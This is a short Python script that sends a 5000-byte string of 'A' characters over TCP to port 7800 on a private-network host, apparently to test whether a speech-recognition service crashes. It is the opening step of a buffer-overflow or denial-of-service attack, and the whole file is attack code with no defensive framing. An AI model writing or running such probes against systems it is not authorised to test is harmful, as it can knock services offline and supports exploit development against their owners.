import socket

target = "192.168.4.43"
port = 7800

# Sending a massive string to see if the ASR service crashes
payload = b"A" * 5000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(payload)
    print("[*] Sent 5000 bytes to Port 7800. Checking connection...")
    s.recv(1024)
except Exception as e:
    print(f"[!] Connection dropped: {e}")

